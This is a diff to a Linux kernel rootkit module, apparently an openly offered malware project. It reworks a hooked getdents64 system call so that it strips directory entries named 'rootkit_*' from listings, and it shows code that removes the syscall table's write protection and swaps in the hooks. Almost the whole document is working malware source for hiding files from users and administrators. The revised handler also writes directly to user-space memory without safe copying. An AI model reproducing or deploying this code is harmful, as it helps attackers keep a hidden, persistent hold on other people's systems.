@@ -71,51 +71,43 @@ asmlinkage ssize_t hooked_getdents (unsigned int fd, struct linux_dirent __user 
 }
 
 asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
-    // declarations
-    char hidename[]="rootkit_";
+    struct linux_dirent64 __user *cur_dirent;
     ssize_t result;
-    unsigned long cur_len = 0;
-    ssize_t remaining_bytes = 0;
-    struct linux_dirent64 * orig_dirent,* head,* prev;
-    char * p=NULL;
+    int bpos;
+    char hidename[] = "rootkit_";
+    unsigned short cur_reclen;
 
-    // retrieve original data and 
-    // allocate memory for intermediate results, 
-    // since we will manipulate data on intermediate memory regions
-    result = (*original_getdents64) (fd, dirent, count);
-    remaining_bytes = result;
-    orig_dirent=(struct linux_dirent64 *)kmalloc(remaining_bytes, GFP_KERNEL);
-    p=(char*)orig_dirent;
-    if(copy_from_user(orig_dirent,dirent,remaining_bytes)) {
-        printk(KERN_INFO "copy error\n");
-        return result;
-    }
-    prev = head = orig_dirent;
-    while(remaining_bytes > 0) {
-        cur_len = orig_dirent->d_reclen;
-        remaining_bytes -= cur_len;
-        if(0==memcmp(hidename, orig_dirent->d_name, strlen(hidename))) {
-            printk(KERN_INFO "found a file to hide:%s\n",orig_dirent->d_name);
-            memmove(orig_dirent, ((char*)orig_dirent + cur_len), (size_t)remaining_bytes);
-            result -= cur_len;
-            continue;
-        }
-        else {
-            prev=orig_dirent;
-        }
+    printk(KERN_INFO "our very own hooked_getdents64\n");
+    result = original_getdents64(fd, dirent, count);
+    printk(KERN_INFO "Here go the files %d :\n", result);
+    printk(KERN_INFO "----------------- Here are the files ------------------------------------");
+    cur_dirent = dirent;
 
-        if(remaining_bytes){
-            orig_dirent = (struct linux_dirent64 *) ((char *)prev + prev->d_reclen);
-        }
+    for (bpos=0; bpos < result;){
+        cur_dirent = (struct linux_dirent64*)((char *)dirent + bpos);
 
+        printk(KERN_INFO "%s\n", (char*)(cur_dirent->d_name));
+        if(0==memcmp(hidename, cur_dirent->d_name, strlen(hidename))) {
+            printk(KERN_INFO "found a file to hide:%s\n",cur_dirent->d_name);
+            //printk(KERN_INFO "shift by %d from %p to %p --- result = %d\n",cur_dirent->d_reclen, cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), result);
+            cur_reclen = cur_dirent->d_reclen;
+            memmove(cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), (size_t)(result - bpos - cur_dirent->d_reclen));
+            memset((char*)dirent + result - cur_reclen, 0, cur_reclen);
+            result -= cur_reclen;
+            //printk(KERN_INFO "new result = %d\n", result);
+        } else {
+            bpos += cur_dirent->d_reclen;
+        }
     }
 
-    // copy data back and return result
-    if(copy_to_user (dirent,head,result)){
-printk (KERN_INFO "error copying data back\n");
-return result;
+    printk(KERN_INFO "----------------- After modification ------------------------------------");
+
+    for(bpos = 0; bpos < result;){
+        cur_dirent = (struct linux_dirent64*)((char *)dirent + bpos);
+        printk(KERN_INFO "%s\n", (char*)(cur_dirent->d_name));
+        bpos += cur_dirent->d_reclen;
     }
-    kfree(p);
+    printk(KERN_INFO "----------------- End of file list ------------------------------------");
     return result;
 
 
@@ -132,7 +124,7 @@ void hook_functions(void){
   // remove write protection
   make_page_writable((long unsigned int) ptr_sys_call_table);
   // replace function pointers! YEEEHOW!!
-  // sys_call_table[__NR_read] = (void*) hooked_read;
+  //sys_call_table[__NR_read] = (void*) hooked_read;
   sys_call_table[__NR_getdents] = (void*) hooked_getdents;
   sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
 }
